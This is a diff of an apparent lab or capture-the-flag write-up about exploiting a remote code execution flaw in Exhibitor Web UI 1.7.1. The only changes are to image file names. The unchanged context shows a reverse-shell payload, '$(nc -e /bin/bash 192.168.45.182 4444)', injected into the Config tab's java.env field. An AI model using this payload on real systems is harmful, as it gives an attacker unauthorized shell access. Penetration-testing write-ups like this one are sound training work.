@@ -68,7 +68,7 @@ Exhibitor Web UI 1.7.1 - Remote Code Execution             | java/webapps/48654.
 
 The Exhibitor RCE is rather simple, and the Config tab looks rather vulnerable.&#x20;
 
-<figure><img src="../../../.gitbook/assets/image (23).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (23) (9).png" alt=""><figcaption></figcaption></figure>
 
 The `java.env` script part seems to be running `bash`. I downloaded the exploit found from `searchsploit`, and attempted their POC:
 
@@ -76,7 +76,7 @@ The `java.env` script part seems to be running `bash`. I downloaded the exploit 
 $(nc -e /bin/bash 192.168.45.182 4444)
 ```
 
-<figure><img src="../../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (10) (2).png" alt=""><figcaption></figcaption></figure>
 
 Afterwards, committing the changes would give us a reverse shell:
 
